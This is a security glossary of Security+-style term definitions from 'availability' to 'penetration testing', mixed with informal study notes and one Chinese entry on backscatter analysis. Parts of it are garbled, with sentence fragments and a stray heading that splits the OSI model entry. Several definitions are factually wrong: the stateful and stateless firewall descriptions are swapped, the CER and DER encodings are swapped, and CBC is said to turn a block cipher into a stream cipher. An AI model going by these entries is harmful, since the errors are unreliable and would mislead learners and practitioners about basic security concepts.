availability—One of the three main goals of information security known as the CIA security triad. Availability ensures that systems and data are up and operational when needed. Compare with confidentiality and integrity.

## B
- backdoor—An alternate method of accessing a system. Malware
often adds a backdoor into a system after it infects it. background check—A check into a person’s history, typically to determine eligibility for a job.
- Backscatter analysis of DoS Attack: Backscatter本意是用
來指涉反向散射的電磁波, 粒子或者訊號, 此概念借用於網路
安全的領域當中, 對於阻斷服務攻擊, 攻擊者經常修改封包當
中的來源位址並送給網路中想要攻擊的對象, 被攻擊的機器無
  法分辨此來源位址的真偽而根據協定內容將回應封包傳送給此
來源位址, 此回應的封包即稱為backscatter. 藉著分析這些回
應封包的來源位址可定序阻斷服務攻擊的特徵值, 此之謂 backscatter analysis.
banner grabbing—A method used to gain information about a remote system. It identifies the operating system and other details on the remote system.
bcrypt—A key stretching algorithm. It is used to protect passwords. Bcrypt salts passwords with additional bits before encrypting them with Blowfish. This thwarts rainbow table attacks.
BIOS—Basic Input/Output System. A computer’s firmware used to manipulate different settings such as the date and time, boot drive, and access password. UEFI is the designated replacement for BIOS. birthday—A password attack named after the birthday paradox in probability theory. The paradox states that for any random group of 23 people, there is a 50 percent chance that 2 of them have the same birthday.
black box test—A type of penetration test. Testers have zero knowledge of the environment prior to starting the test. Compare with gray box test and white box test.
block cipher—An encryption method that encrypts data in fixed-sized blocks. Compare with stream cipher.
Blowfish—A strong symmetric block cipher. It encrypts data in 64-bit blocks and supports key sizes between 32 and 448 bits. Compare with Twofish.
bluejacking—An attack against Bluetooth devices. It is the practice of sending unsolicited messages to nearby Bluetooth devices. bluesnarfing—An attack against Bluetooth devices. Attackers gain unauthorized access to Bluetooth devices and can access all the data on the device. theft data from a mobile device.
Bluesmacking 猛烈地: simple denial-of-service attack against the device. Bluesniffing: to discover Bluetooth-enabled devices, like war driving in wireless hacking.
Bluebugging: Successfully accessing a Bluetooth-enabled device and remotely using its features. gaining full access to the phone, the attacker installs a backdoor. To listen in on phone conversations, enable call forwarding, send messages... Blueprinting: as footprinting for Bluetooth: involves collecting device info over Bluetooth.
bollards—Short vertical posts that act as a barricade. Bollards block vehicles but not people.
bots—Software robots that function automatically. A botnet is a group of computers that are joined together. Attackers often use malware to join computers to a botnet, and then use the botnet to launch attacks. BPA—Business partners agreement. A written agreement that details the relationship between business partners, including their obligations toward the partnership.
bridge—A network device used to connect multiple networks together. It can be used instead of a router in some situations.
brute force—A password attack that attempts to guess a password. Online brute force attacks guess passwords of online systems. Offline attacks guess passwords contained in a file or database.
buffer overflow—An error that occurs when an application receives more input, or different input, than it expects. It exposes system memory that is normally inaccessible.
business impact analysis (BIA)—A process that helps an organization identify critical systems and components that are essential to the organization’s success.
BYOD—Bring your own device. A mobile device deployment model. Employees can connect their personally owned device to the network. Compare with COPE and CYOD.
C
CA—Certificate Authority. An organization that manages, issues, and signs certificates. A CA is a main element of a PKI.
CAC—Common Access Card. A specialized type of smart card used by the U.S. Department of Defense. It includes photo identification and provides confidentiality, integrity, authentication, and non-repudiation.
captive portal—A technical solution that forces wireless clients using web browsers to complete a process before accessing a network. It is often used to ensure users agree to an acceptable use policy or pay for access.
carrier unlocking—The process of unlocking a mobile phone from a specific cellular provider.
CBC—Cipher Block Chaining. A mode of operation used for encryption that effectively converts a block cipher into a stream cipher. It uses an IV for the first block and each subsequent block is combined with the previous block.
CCMP—Counter Mode with Cipher Block Chaining Message Authentication Code Protocol. An encryption protocol based on AES and used with WPA2 for wireless security. It is more secure than TKIP, which was used with the original release of WPA.
CER—Canonical Encoding Rules. A base format for PKI certificates. They are binary encoded files. Compare with DER.
certificate—A digital file used for encryption, authentication, digital signatures, and more. Public certificates include a public key used for asymmetric encryption.
certificate chaining—A process that combines all certificates within a trust model. It includes all the certificates in the trust chain from the root CA down to the certificate issued to the end user.
chain of custody—A process that provides assurances that evidence has been controlled and handled properly after collection. Forensic experts establish a chain of custody when they first collect evidence.
change management—The process used to prevent unauthorized changes. Unauthorized changes often result in unintended outages. CHAP—Challenge Handshake Authentication Protocol. An authentication mechanism where a server challenges a client. Compare with MS-CHAPv2 and PAP.
chroot—A Linux command used to change the root directory. It is often used for sandboxing.
ciphertext—The result of encrypting plaintext. Ciphertext is not in an easily readable format until it is decrypted.
clean desk policy—A security policy requiring employees to keep their areas organized and free of papers. The goal is to reduce threats of security incidents by protecting sensitive data.
- clickjacking—An attack that tricks users into clicking something other than what they think they’re clicking.
- Clipping level — Sets certain thresholds for specific errors or mistakes allowed and the amount of these occurrences that can take place before it is considered suspicious
cloud access security broker (CASB)—A software tool or service that enforces cloud-based security requirements. It is placed between the organization’s resources and the cloud, monitors all network traffic, and can enforce security policies.
cloud deployment models—Cloud model types that identify who has access to cloud resources. Public clouds are for any organization. Private clouds are for a single organization. Community clouds are shared among community organizations. A hybrid cloud is a combination of two or more clouds.
code signing—The process of assigning a certificate to code. The certificate includes a digital signature and validates the code.
cold site—An alternate location for operations. A cold site will have power and connectivity needed for activation, but little else. Compare with hot site and warm site.
collision—A hash vulnerability that can be used to discover passwords. A hash collision occurs when two different passwords create the same hash.
compensating controls—Security controls that are alternative controls used when a primary security control is not feasible.
compiled code—Code that has been optimized by an application and converted into an executable file. Compare with runtime code. confidential data—Data meant to be kept secret among a certain group of people. example, salary data is meant to be kept secret and not shared with everyone within a company.
confidentiality—One of the three main goals of information security known as the CIA security triad. Confidentiality ensures that unauthorized entities cannot access data. Encryption and access controls help protect against the loss of confidentiality. Compare with availability and integrity.
configuration compliance scanner—A type of vulnerability scanner that verifies systems are configured correctly. It will often use a file that identifies the proper configuration for systems.
confusion—A cryptography concept that indicates ciphertext is significantly different than plaintext.
containerization—A method used to isolate applications in mobile devices. It isolates and protects the application, including any data used by the application.
context-aware authentication— An authentication method using multiple elements to authenticate a user and a mobile device. It can include identity, geolocation, the device type, and more.
continuity of operations planning—The planning process that identifies an alternate location for operations after a critical outage. It can include a hot site, cold site, or warm site.
control diversity—The use of different security control types, such as technical controls, administrative controls, and physical controls. Compare with vendor diversity.
controller-based AP—An AP that is managed by a controller. Also called a thin AP. Compare with fat AP.
COPE—Corporate-owned, personally enabled. A mobile device deployment model. The organization purchases and issues devices to employees. Compare with BYOD and CYOD.
corrective controls—Security controls that attempt to reverse the impact of a security incident.
CRL—Certificate revocation list. A list of certificates that a CA has revoked. Certificates are commonly revoked if they are compromised, or issued to an employee who has left the organization.
crossover error rate—The point where the false acceptance rate (FAR) crosses over with the false rejection rate (FRR). A lower CER indicates a more accurate biometric system.
cross-site request forgery (XSRF)—A web application attack. XSRF attacks trick users into performing actions on web sites, such as making purchases, without their knowledge.
cross-site scripting (XSS)—A web application vulnerability. Attackers embed malicious HTML or JavaScript code into a web site’s code, which executes when a user visits the site.
crypto-malware—A type of ransomware that encrypts the user’s data. crypto module—A set of hardware, software, and/or firmware that implements cryptographic functions. Compare with crypto service provider.
crypto service provider—A software library of cryptographic standards and algorithms. These libraries are typically distributed within crypto modules.
CSR—Certificate signing request. A method of requesting a certificate from a CA. It starts by creating an RSA-based private/public key pair and then including the public key in the CSR.
CTM—Counter mode. A mode of operation used for encryption that combines an IV with a counter. The combined result is used to encrypt blocks.
custom firmware—Mobile device firmware other than the firmware provided with the device. People sometimes use custom firmware to root Android devices.
cyber-incident response team—A group of experts who respond to security incidents. Also known as CIRT.
CYOD—Choose your own device. A mobile device deployment model. Employees can connect their personally owned device to the network as long as the device is on a preapproved list. Compare with BYOD and COPE.

## D
- DAC—Discretionary access control. An access control model, owners can modify permissions for the objects (files and folders). Microsoft NTFS uses the DAC model.
- data-at-rest—Any data stored on media. It’s common to encrypt sensitive data- at-rest.
- data execution prevention (DEP)—A security feature that prevents code from executing in memory regions marked as nonexecutable. It helps block malware.
- data exfiltration—The unauthorized transfer of data outside an organization.
- data-in-transit—Any data sent over a network. It’s common to encrypt sensitive data-in-transit.
data-in-use—Any data currently being used by a computer. Because the
computer needs to process the data, it is not encrypted while in use. data retention policy—A security policy specifying how long data should be kept (retained). data sovereignty—A term that refers to the legal implications of data stored in different countries. It is primarily a concern related to backups stored in alternate locations via the cloud.
- DDoS—Distributed denial-of-service. An attack on a system launched from multiple sources intended to make a computer’s resources or services unavailable to users. DDoS attacks typically include sustained, abnormally high network traffic. Compare with DoS.
dead code—Code that is never executed or used. It is often caused by logic errors.
defense in depth—The use of multiple layers of security to protect resources. Control diversity and
vendor diversity are two methods organizations implement to provide defense in depth.
degaussing—The process of removing data from magnetic media using a very powerful electronic magnet. Degaussing is sometimes used to remove data from backup tapes or to destroy hard disks. DER—Distinguished Encoding Rules. A base format for PKI certificates. They are BASE64 ASCII encoded files. Compare with CER. DES—Data Encryption Standard. A legacy symmetric encryption standard used to provide confidentiality. It has been compromised and AES or 3DES should be used instead.
detective controls—Security controls that attempt to detect security incidents after they have occurred.
deterrent controls—Security controls that attempt to discourage individuals from causing a security incident.
dictionary—A password attack that uses a file of words and character combinations. The attack tries every entry within the file when trying to guess a password.
differential backup—A type of backup that backs up all the data that has changed or is different since the last full backup. Diffie-Hellman (DH)—An asymmetric algorithm used to privately share symmetric keys. DH Ephemeral (DHE) uses ephemeral keys, which are re- created for each session. Elliptic Curve DHE (ECDHE) uses elliptic curve cryptography to generate encryption keys.
diffusion—A cryptography concept that ensures that small changes in plaintext result in significant changes in ciphertext.
dig—A command-line tool used to test DNS on Linux systems. Compare with
nslookup.
digital signature—An encrypted hash of a message, encrypted with the sender’s private key. It provides authentication, non-repudiation, and integrity.
disablement policy—A policy that identifies when administrators should disable user accounts.
disassociation attack—An attack that removes wireless clients from a wireless network.
dissolvable agent—A NAC agent that runs on a client, but deletes itself later. It checks the client for health. Compare with permanent agent. DLL injection—An attack that injects a Dynamic Link Library (DLL) into memory and runs it. Attackers rewrite the DLL, inserting malicious code.
DLP—Data loss prevention. A group of technologies used to prevent data loss. They can block the use of USB devices, monitor outgoing email to detect and block unauthorized data transfers, and monitor data stored in the cloud.
DMZ—Demilitarized zone. A buffer zone between the Internet and an internal network. Internet clients can access the services hosted on servers in the DMZ, but the DMZ provides a layer of protection for the internal network.
- DNS—Domain Name System. A service used to resolve host names to IP addresses. DNS zones include records such as A records for IPv4 addresses and AAAA records for IPv6 addresses.
DNSSEC—Domain Name System Security Extensions. A suite of extensions to DNS used to protect the integrity of DNS records and prevent some DNS attacks. DNS poisoning—An attack that modifies or corrupts DNS results. DNSSEC helps prevent DNS poisoning.
domain hijacking—An attack that changes the registration of a domain name without permission from the owner.
- DoS—Denial-of-service. An attack from a single source that attempts to disrupt the services provided by the attacked system. Compare with DDoS.
- downgrade attack—A type of attack that forces a system to downgrade its security. The attacker then exploits the lesser security control.
- Drive-By Downloads. the unintended download of computer software from the Internet. happen when visiting a website,
opening e-mail attachment or clicking a link, or a deceptive pop-up window, by clicking on the window in the mistaken belief that, for example, an error report from the computer's operating system itself is being acknowledged or a seemingly innocuous advertisement pop-up is being dismissed. Then the "supplier" claim that the user "consented" to the download of an unwanted or malicious software download. Similarly if a person is visiting a site with malicious content, the person may become victim to a drive- by download attack, the malicious content may be able to exploit vulnerabilities in the browser or plugins to run malicious code without the user’s knowledge.
- Drive-by install: a similar event. It refers to installation rather than download (though sometimes the two terms are used interchangeably).
DSA—Digital signature algorithm. An encrypted hash of a message used for authentication, non- repudiation, and integrity. The sender’s private key encrypts the hash of the message.
dumpster diving—The practice of searching through trash looking to gain information from discarded documents. Shredding or burning papers helps prevent the success of dumpster diving.
E
 EAP—Extensible Authentication Protocol. An authentication framework that provides general guidance for authentication methods. Variations include PEAP, EAP-TLS, EAP-TTLS, and EAP-FAST. EAP-FAST—EAP-Flexible Authentication via Secure Tunneling (EAP- FAST). A Cisco-designed replacement for Lightweight EAP (LEAP). EAP- FAST supports certificates, but they are optional. EAP-TLS—Extensible Authentication Protocol-Transport Layer Security. An
extension of EAP sometimes used with 802.1x. This is one of the most secure EAP standards and is widely implemented. It requires certificates on the 802.1x server and on the clients.
EAP-TTLS—Extensible Authentication Protocol-Tunneled Transport Layer Security. An extension of EAP sometimes used with 802.1x. It allows systems to use some older authentication methods such as PAP within a TLS tunnel. It requires a certificate on the 802.1x server but not on the clients.
ECB—Electronic Codebook. A legacy mode of operation used for encryption. It is weak and should not be used.
embedded system—Any device that has a dedicated function and uses a computer system to perform that function. It includes a CPU, an operating system, and one or more applications. EMI—Electromagnetic interference. Interference caused by motors, power lines, and fluorescent lights. EMI shielding prevents outside interference sources from corrupting data and prevents data from emanating outside the cable.
EMP—Electromagnetic pulse. A short burst of energy that can potentially damage electronic equipment. It can result from electrostatic discharge (ESD), lightning, and military weapons.
encryption—A process that scrambles, or ciphers, data to make it unreadable. Encryption normally includes a public algorithm and a private key. Compare with asymmetric and symmetric encryption. Enterprise—A wireless mode that uses an 802.1x server for security. It forces users to authenticate with a username and password. Compare with Open and PSK modes.
ephemeral key—A type of key used in cryptography. Ephemeral keys have very short lifetimes and are re-created for each session.
error handling—A programming process that handles errors gracefully. ESP—Encapsulating Security Payload. An option within IPsec to provide confidentiality, integrity, and authentication.
evil twin—A type of rogue AP. An evil twin has the same SSID as a legitimate AP.
exit interview—An interview conducted with departing employees just before they leave an organization.
exploitation frameworks—Tools used to store information about security vulnerabilities. They are often used by penetration testers (and attackers) to detect and exploit software.
extranet—The part of an internal network shared with outside entities. Extranets are often used to provide access to authorized business partners, customers, vendors, or others.
F
facial recognition—A biometric method that identifies people based on facial features.
false negative—A security incident that isn’t detected or reported. example, a NIDS false negative occurs if an attack is active on the network
but the NIDS does not raise an alert.
false positive—An alert on an event that isn’t a security incident. example, a NIDS false positive occurs if the NIDS raises an alert but activity on the network is normal.
FAR—False acceptance rate. Also called the false match rate. A rate that identifies the percentage of times a biometric authentication system incorrectly indicates a match.
Faraday cage—A room or enclosure that prevents signals from emanating beyond the room or enclosure. fat AP—An AP that includes everything needed to connect wireless clients to a wireless network. Fat APs must be configured independently. Sometimes called a stand-alone AP. Compare with thin AP.
fault tolerance—The capability of a system to suffer a fault, but continue to operate. Said another way, the system can tolerate the fault as if it never occurred.
FDE—Full disk encryption. A method to encrypt an entire disk. Compare with
SED.
federation—Two or more members of a federated identity management system. Used for single sign-on.
fingerprint scanners—Biometric systems that scan fingerprints for authentication.
firewall—A software or a network device used to filter traffic. Firewalls can be application-based (running on a host), or a network-based device. Stateful firewalls filter traffic using rules within an ACL. Stateless firewalls filter traffic based on its state within a session.
firmware OTA updates—Over-the-air updates for mobile device firmware that keep them up to date. These are typically downloaded to the device from the Internet and applied to update the device.
flood guard—A method of thwarting flood attacks. On switches, a flood guard thwarts MAC flood attacks. On routers, a flood guard prevents SYN flood attacks.
framework—A structure used to provide a foundation. Cybersecurity frameworks typically use a structure of basic concepts and provide guidance to professionals on how to implement security.
FRR—False rejection rate. Also called the false nonmatch rate. A rate that identifies the percentage of times a biometric authentication system incorrectly rejects a valid match.
FTPS—File Transfer Protocol Secure. An extension of FTP that uses TLS to encrypt FTP traffic. Some implementations of FTPS use TCP ports 989 and 990.
full backup—A type of backup that backs up all the selected data. A full backup could be considered a normal backup.
full tunnel—An encrypted connection used with VPNs. When a user is connected to a VPN, all traffic from the user is encrypted. Compare with split tunnel.

## G
GCM—Galois/Counter Mode. A mode of operation used for encryption. It combines the Counter (CTM) mode with hashing techniques for data authenticity and confidentiality.
geofencing—A virtual fence or geographic boundary. It uses GPS to create the boundary. Apps can then respond when a mobile device is within the virtual fence.
geolocation—The location of a device identified by GPS. It can help locate a lost or stolen mobile device.
GPO—Group Policy Object. A technology used within Microsoft Windows to manage users and computers. It is implemented on a domain controller within a domain.
GPS—Global Positioning System. A satellite-based navigation system that identifies the location of a device or vehicle. Mobile devices often incorporate GPS capabilities.
GPS tagging—A process of adding geographical data to files such as pictures. It typically includes latitude and longitude coordinates of the location where the picture was taken or the file was created.
Gratuitous ARP: not waiting for request just sending the reply.
gray box test—A type of penetration test. Testers have some knowledge of the environment prior to starting the test. Compare with black box test and white box test.
group-based access control—A role-based access control method that uses groups as roles.
Guest account—A pre-created account in Windows systems. It is disabled by default. H
hacktivist—An attacker who launches attacks as part of an activist movement or to further a cause.
hardware root of trust—A known secure starting point. TPMs have a private key burned into the hardware that provides a hardware root of trust.
hash—A number created by executing a hashing algorithm against data, such as a file or message. Hashing is commonly used for integrity. Common hashing algorithms are MD5, SHA-1, and HMAC. heuristic/behavioral—A type of monitoring on intrusion detection and intrusion prevention systems. It detects attacks by comparing traffic against a baseline. It is also known as anomaly detection. HIDS—Host-based intrusion detection system. Software installed on a system to detect attacks. It protects local resources on the host. A host- based intrusion prevention system (HIPS) is an extension of a HIDS. It is software installed on a system to detect and block attacks.
high availability—A term that indicates a system or component remains available close to 100 percent of the time.
HMAC—Hash-based Message Authentication Code. A hashing algorithm used to verify integrity and authenticity of a message with the use of a shared secret. It is typically combined with another hashing algorithm such as SHA.
hoax—A message, often circulated through email, that tells of impending doom from a virus or other security threat that simply doesn’t exist.
home automation—Smart devices used within the home that have IP addresses. These are typically accessible via the Internet and are part of the Internet of things (IoT).
honeypot—A server designed to attract an attacker. It typically has weakened security encouraging attackers to investigate it.
honeynet—A group of honeypots in a network. Honeynets are often configured in virtual networks.
hot and cold aisles—A method commonly used in data centers to keep equipment cool. Cool air flows from the front of the cabinets to the back, making the front aisle cooler and the back aisle warmer. HOTP—HMAC-based One-Time Password. An open standard used for creating one-time passwords. It combines a secret key and a counter, and then uses HMAC to create a hash of the result.
hot site—An alternate location for operations. A hot site typically includes everything needed to be operational within 60 minutes. Compare with cold site and warm site.
HSM—Hardware security module. A removable or external device that can generate, store, and manage RSA keys used in asymmetric encryption. Compare with TPM.
HTTPS—Hypertext Transfer Protocol Secure. A protocol used to encrypt HTTP traffic. HTTPS encrypts traffic with TLS using TCP port 443.
HVAC—Heating, ventilation, and air conditioning. A physical security control that increases availability by regulating airflow within data centers and server rooms.
I
IaaS—Infrastructure as a Service. A cloud computing model that allows an organization to rent access to hardware in a self-managed platform. Compare with PaaS and SaaS.
ICS—Industrial control system. A system that controls large systems such as power plants or water treatment facilities. A SCADA system controls the ICS.
identification—The process that occurs when a user claims an identity, such as with a username.
IEEE 802.1x—An authentication protocol used in VPNs and wired and wireless networks. VPNs often implement it as a RADIUS server. Wired networks use it for port-based authentication. Wireless networks use it in Enterprise mode. It can be used with certificate-based authentication. ifconfig—A command-line tool used on Linux systems to show and manipulate settings on a network interface card (NIC). Similar to ipconfig used on Windows systems.
IMAP4—Internet Message Access Protocol version 4. A protocol used to store and manage email on servers. IMAP4 uses TCP port 143. Secure IMAP4 uses TLS to encrypt IMAP4 traffic.
impact—The magnitude of harm related to a risk. It is the negative result of an event, such as the loss of confidentiality, integrity, or availability of a system or data. Compare with likelihood of occurrence.
implicit deny—A rule in an ACL that blocks all traffic that hasn’t been explicitly allowed. The implicit deny rule is the last rule in an ACL.
Incident response. The process of responding to a security incident. Organizations often create an incident response plan that outlines the procedures to be used when responding to an incident.
incident response plan (IRP)—The procedures documented in an incident response policy.
incident response process—The phases of incident response, including preparation, identification, containment, eradication, recovery, and lessons learned.
incremental backup—A type of backup that backs up all the data that has changed since the last full or incremental backup.
injection attack—An attack that injects code or commands. Common injection attacks are DLL injection, command injection, and SQL injection attacks.
inline—A configuration that forces traffic to pass through a device. A NIPS is placed inline, allowing it to prevent malicious traffic from entering a network. Sometimes called in-band. Compare with out- of- band.
input validation—A programming process that verifies data is valid before using it.
insider—An attacker who launches attacks from within an organization, typically as an employee.
integer overflow—An application attack that attempts to use or create a numeric value that is too big for an application to handle. Input handling and error handling thwart the attack.
integrity—One of the three main goals of information security known as the CIA security triad. Integrity provides assurance that data or system configurations have not been modified. Audit logs and hashing are two methods used to ensure integrity. Compare with availability and confidentiality.
intranet—An internal network. People use an intranet to communicate and share content with each other.
IoT—Internet of things. The network of physical devices connected to the Internet. It typically refers to smart devices with an IP address, such as wearable technology and home automation systems.
ip—A command-line tool used on Linux systems to show and manipulate settings on a network interface card (NIC). Developers created this to replace ifconfig.
ipconfig—A command-line tool used on Windows systems to show the configuration settings on a NIC.
IPsec—Internet Protocol security. A suite of protocols used to encrypt data-in- transit that can operate in both Tunnel mode and Transport mode. It uses Tunnel mode for VPN traffic and Transport mode in private networks.
IP spoofing—An attack that changes the source IP address.
iris scanners—Biometric systems that scan the iris of an eye for authentication.
ISA—Interconnection security agreement. An agreement that specifies technical and security requirements for connections between two or more entities. Compare with MOU/MOA.
IV (initialization vector) attack—A wireless attack that attempts to discover
the IV. Legacy wireless security protocols are susceptible to IV attacks. J
jailbreaking—The process of modifying an Apple mobile device to remove software restrictions. It allows a user to install software from any third-party source. Compare with rooting.
jamming—A DoS attack against wireless networks. It transmits noise on the same frequency used by a wireless network.
job rotation—A process that ensures employees rotate through different jobs to learn the processes and procedures in each job. It can sometimes detect fraudulent activity.


## K
KDC—Key Distribution Center. Also known as a TGT server. Part of the Kerberos protocol used for network authentication. The KDC issues timestamped tickets that expire.
Kerberos—A network authentication mechanism used with Windows Active Directory domains and some Unix environments known as realms. It uses a KDC to issue tickets.
kernel—The central part of the operating system. In container virtualization, guests share the kernel.
key escrow—The process of placing a copy of a private key in a safe environment.
keylogger—Software or hardware used to capture a user’s keystrokes. Keystrokes are stored in a file and can be manually retrieved or automatically sent to an attacker.
key stretching—A technique used to increase the strength of stored passwords. It adds additional bits (called salts) and can help thwart brute force and rainbow table attacks.
known plaintext—A cryptographic attack that decrypts encrypted data. In this attack, the attacker knows the plaintext used to create ciphertext.

## L
labeling—The process of ensuring data is tagged clearly so that users know its classification. Labels can be physical labels, such as on backup tapes, or digital labels embedded in files.
LDAP—Lightweight Directory Access Protocol. A protocol used to communicate with directories such as Microsoft Active Directory. It identifies objects with query strings using codes such as CN=Users and DC=GetCertifiedGetAhead.
LDAPS—Lightweight Directory Access Protocol Secure. A protocol used to encrypt LDAP traffic with TLS.
least functionality—A core principle of secure systems design. Systems should be deployed with only the applications, services, and protocols needed to meet their purpose.
least privilege—A security principle that specifies that individuals and processes are granted only the rights and permissions needed to perform assigned tasks or functions, but no more.
legal hold—A court order to maintain data for evidence. likelihood of occurrence—The probability that something will occur. It is used with impact in a qualitative risk assessment. Compare with impact.
load balancer—Hardware or software that balances the load between two or more servers. Scheduling methods include source address IP affinity and round-robin.
location-based policies—Policies that prevent users from logging on from certain locations, or require that they log on only from specific locations.
logic bomb—A type of malware that executes in response to an event. The event might be a specific date or time, or a user action such as when a user launches a specific program.
loop prevention—A method of preventing switching loop or bridge loop problems. Both STP and RSTP prevent switching loops.

## M
MAC—Mandatory access control. An access control model that uses sensitivity labels assigned to objects (files and folders) and subjects (users). MAC restricts access based on a need to know.
MAC—Media access control. A 48-bit address used to identify network interface cards. It is also called a hardware address or a physical address. MAC filtering—A form of network access control to allow or block access based on the MAC address. It is configured on switches for port security or on APs for wireless security. MAC spoofing—An attack that changes the source MAC address.
mail gateway—A server that examines and processes all incoming and outgoing email. It typically includes a spam filter and DLP capabilities. Some gateways also provide encryption services.
- malware—Malicious software. It includes a wide range of software that has malicious intent, such as viruses, worms, ransomware, rootkits, logic bombs, and more.
- Malvertising. the use of online advertising to spread malware. injecting malicious or malware-laden advertisements into legitimate online advertising networks and webpages.
mandatory vacation—A policy that forces employees to take a vacation. The goal is to deter malicious activity, such as fraud and embezzlement, and detect malicious activity when it occurs.
man-in-the-browser—An attack that infects vulnerable web browsers. It can allow the attacker to capture browser session data, including keystrokes.
man-in-the-middle (MITM)—An attack using active interception or eavesdropping. It uses a third computer to capture traffic sent between two other systems.
mantrap—A physical security mechanism designed to control access to a secure area. A mantrap prevents tailgating.
MD5—Message Digest 5. A hashing function used to provide integrity. MD5 creates 128-bit hashes, which are also referred to as MD5 checksums. Experts consider MD5 cracked.
MDM—Mobile device management. A group of applications and/or technologies used to manage mobile devices. MDM tools can monitor mobile devices and ensure they are in compliance with security policies. memory leak—An application flaw that consumes memory without releasing it.
MFDs—Multi-function devices. Any device that performs multiple functions. example, many printers are MFDs because they can print, scan, and copy documents. Many also include faxing capabilities. MMS—Multimedia Messaging Service. A method used to send text messages. It is an extension of SMS and supports sending multimedia
 content.
MOU/MOA—Memorandum of understanding or memorandum of agreement. A type of agreement that defines responsibilities of each party. Compare with ISA.
MS-CHAPv2—Microsoft Challenge Handshake Authentication Protocol version 2. Microsoft implementation of CHAP. MS-CHAPv2 provides mutual authentication. Compare with CHAP and PAP.
MTBF—Mean time between failures. A metric that provides a measure of a system’s reliability and is usually represented in hours. The MTBF identifies the average time between failures.
MTTR—Mean time to recover. A metric that identifies the average time it takes to restore a failed system. Organizations that have maintenance contracts often specify the MTTR as a part of the contract.
multifactor authentication—A type of authentication that uses methods from more than one factor of authentication.

## N
NAC—Network access control. A system that inspects clients to ensure they are healthy. Agents inspect clients and agents can be permanent or dissolvable (agentless).
NAT—Network Address Translation. A service that translates public IP addresses to private IP addresses and private IP addresses to public IP addresses.
NDA—Non-disclosure agreement. An agreement that is designed to prohibit personnel from sharing proprietary data. used with employees within the organization and with other organizations.
Netcat—A command-line tool used to connect to remote systems. netstat—A command-line tool used to show network statistics on a system.
network mapping—A process used to discover devices on a network, including how they are connected.
network scanner—A tool used to discover devices on a network, including their IP addresses, their operating system, along with services and protocols running on the devices. NFC attack—An attack against mobile devices that use near field communication (NFC). NFC is a group of standards that allow mobile devices to communicate with nearby mobile devices. NIDS—Network-based intrusion detection system. A device that detects attacks and raises alerts. A NIDS is installed on network devices, such as routers or firewalls, and monitors network traffic. NIPS—Network-based intrusion prevention system. A device that detects and stops attacks in progress. A NIPS is placed inline (in-band) with traffic to actively monitor data streams.
NIST—National Institute of Standards and Technology. NIST is a part of the U.S. Department of Commerce, and it includes an Information Technology Laboratory (ITL). The ITL publishes special publications related to security that are freely available to anyone.
Nmap—A command-line tool used to scan networks. It is a type of network scanner.
nonce—A number used once. Cryptography elements frequently use a nonce to add randomness.
non-persistence—A method used in virtual desktops where changes made by a user are not saved. Most (or all) users have the same desktop. When users log off, the desktop reverts to its original state. non-repudiation—The ability to prevent a party from denying an action. Digital signatures and access logs provide non-repudiation. normalization—The process of organizing tables and columns in a database. Normalization reduces redundant data and improves overall database performance.
- **nslookup** A command-line tool used to test DNS on Microsoft systems. Compare with dig.
NTLM—New Technology LAN Manager. A suite of protocols that provide confidentiality, integrity, and authentication within Windows systems. Versions include NTLM, NTLMv2, and NTLM2 Session.

## O
OAuth—An open source standard used for authorization with Internet- based single sign-on solutions. obfuscation—An attempt to make something unclear or difficult to understand. Steganography methods use obfuscation to hide data within data.
OCSP—Online Certificate Status Protocol. An alternative to using a CRL. It allows entities to query a CA with the serial number of a certificate. The CA answers with good, revoked, or unknown.
onboarding—The process of granting individuals access to an organization’s computing resources after being hired. It typically includes giving the employee a user account with appropriate permissions.
Open—A wireless mode that doesn’t use security. Compare with Enterprise
and PSK modes.
OpenID Connect—An open source standard used for identification on the Internet. It is typically used with OAuth and it allows clients to verify the identity of end users without managing their credentials. open-source intelligence—A method of gathering data using public sources, such as social media sites and news outlets.
order of volatility—A term that refers to the order in which you should collect evidence. example, data in memory is more volatile than data on a disk drive, so it should be collected first.
- OSI model. Open Systems Interconnection (OSI) reference model, is a conceptual and logical layout that defines how application
communicate across the network. Its goal is the interoperability of diverse communication systems with standard communication protocols.
  - Layer 1: Physical Layer. responsible for the transmission and reception of unstructured raw data between a device and a physical transmission medium. It converts the digital bits into electrical, radio, or optical signals.
  - Layer 2: Data Link. provides node-to-node data transfer—a link between two directly connected nodes. It detects and possibly corrects errors that may occur in the physical layer.
 P
It defines the protocol to establish and terminate a connection between two physically connected devices. It also defines the protocol for flow control between them. (Frames)
  - Layer 3: Network Layer. transferring variable length data sequences (packets) from one node to another connected in "different networks".
  - Layer 4: Transport Layer. transferring variable-length data sequences from a source to a destination host, while maintaining the quality of service functions. (TCP/UDP)
  - Layer 5: Session Layer. controls the dialogues (connections) between computers. It establishes, manages and terminates the connections between the local and remote application. It provides for full-duplex, half-duplex, or simplex operation, and establishes procedures for checkpointing, suspending, restarting, and terminating a session. responsible for gracefully closing a session (the Transmission Control Protocol at the transport layer in the Internet Protocol Suite). and for session checkpointing and recovery, which is not usually used in the Internet Protocol Suite.
  - Layer 6: Presentation Layer. responsible for the formatting of data being exchanged, translating between application and network formats.
  - Layer 7: Application Layer. provides a basic underlying network infrastructure, allows applications to communicate with each other.
- out-of-band—A configuration that allows a device to collect traffic without the traffic passing through it. Sometimes called passive. Compare with inline. P7B—PKCS#7. A common format for PKI certificates. They are DER- based (ASCII) and commonly used to share public keys. P12—PKCS#12. A common format for PKI certificates. They are CER- based (binary) and often hold certificates with the private key. They are commonly encrypted.
PaaS—Platform as a Service. A cloud computing model that provides cloud customers with a preconfigured computing platform they can use as needed. Compare with IaaS and SaaS.
PAP—Password Authentication Protocol. An older authentication protocol where passwords or PINs are sent across the network in cleartext. Compare with CHAP and MS-CHAPv2.
passive reconnaissance—A penetration testing method used to collect information. It typically uses open-source intelligence. Compare with active reconnaissance.
pass the hash—A password attack that captures and uses the hash of a password. It attempts to log on as the user with the hash and is commonly associated with the Microsoft NTLM protocol.
password cracker—A tool used to discover passwords.
patch management—The process used to keep systems up to date with current patches. It typically includes evaluating and testing patches before deploying them.
PBKDF2—Password-Based Key Derivation Function 2. A key stretching technique that adds additional bits to a password as a salt. It helps prevent brute force and rainbow table attacks.
PEAP—Protected Extensible Authentication Protocol. An extension of EAP sometimes used with 802.1x. PEAP requires a certificate on the 802.1x server.
PEM—Privacy Enhanced Mail. A common format for PKI certificates. It can use either CER (ASCII) or DER (binary) formats and can be used for almost any type of certificates.
penetration testing—A method of testing targeted systems to determine if vulnerabilities can be exploited. Penetration tests are intrusive. Compare with vulnerability scanner.
